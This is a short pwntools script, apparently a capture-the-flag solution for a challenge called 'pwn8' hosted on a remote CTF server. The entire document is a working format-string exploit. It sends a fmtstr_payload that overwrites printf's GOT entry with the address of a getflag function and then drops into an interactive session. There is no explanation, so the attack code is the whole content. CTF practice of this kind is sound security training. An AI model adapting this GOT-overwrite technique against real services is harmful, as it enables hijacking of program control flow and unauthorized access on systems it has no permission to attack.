from pwn import *
context.log_level = 'debug'

#cn = process('pwn8')
cn = remote('ctf.cnss.studio', 5008)
bin = ELF('pwn8')

cn.recv()
got_printf = 0x0804A010
p_getflag = 0x080485D0
pay = fmtstr_payload(4, {got_printf : p_getflag})

cn.sendline(pay)

cn.interactive()
